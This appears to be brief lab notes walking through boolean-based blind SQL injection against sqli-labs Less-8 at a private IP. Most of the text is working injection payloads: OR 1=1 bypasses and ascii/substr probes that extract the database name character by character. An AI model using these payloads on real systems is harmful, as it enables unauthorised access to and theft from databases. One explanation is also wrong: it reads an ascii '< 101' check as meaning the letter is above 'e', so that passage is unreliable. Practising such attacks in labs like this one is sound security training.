Try to find a result:

E.g: http://10.10.22.134/sqli-labs/Less-8/?id=1

if you get a "True" as value. Try then to change 1 by 99999999 and 
if you get a false(or just an empty page) that means the page is vulnb. by blind SQLi.


Let's try to bypass the SQL query then:
10.10.22.134/sqli-labs/Less-8/?id=1' OR 1 = 1 --+

that should still give us a True value.

What if we change like this:
10.10.22.134/sqli-labs/Less-8/?id=1' OR 1 = 2 --+

Then we should get a False result.

Now that we can bypass the sql query, let's try to guess the database name by
playing true or false.

10.10.22.134/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()),1,1))) = 115 --+

Here we are looking for the first letter of the database
By using substr = 'substring', we ask the first letter of the database.

By using the ascii, we make our life easier.
We can just use greater or less than the given ascii number.

E.g.:
10.10.22.134/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()),2,1))) < 101 --+

here we check if the second letter of the database name is less than 101:
that means if the second letter is above the letter "e"
